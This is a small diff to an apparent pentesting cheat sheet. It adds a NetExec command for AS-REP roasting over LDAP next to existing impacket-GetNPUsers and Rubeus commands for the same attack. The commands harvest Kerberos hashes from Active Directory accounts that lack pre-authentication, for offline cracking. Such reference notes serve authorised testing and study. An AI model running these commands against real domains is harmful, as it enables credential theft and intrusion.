@@ -500,6 +500,9 @@ impacket-GetNPUsers -dc-ip 192.168.50.70 -request -outputfile hash corp.com/pete
 
 impacket-GetNPUsers -dc-ip <ip> -no-pass <domain>/<user>
 ```
+```bash
+nxc ldap 192.168.0.104 -u user.txt -p '' --asreproast output.txt
+```
 ```powershell
 .\Rubeus.exe asreproast /nowrap
 ```
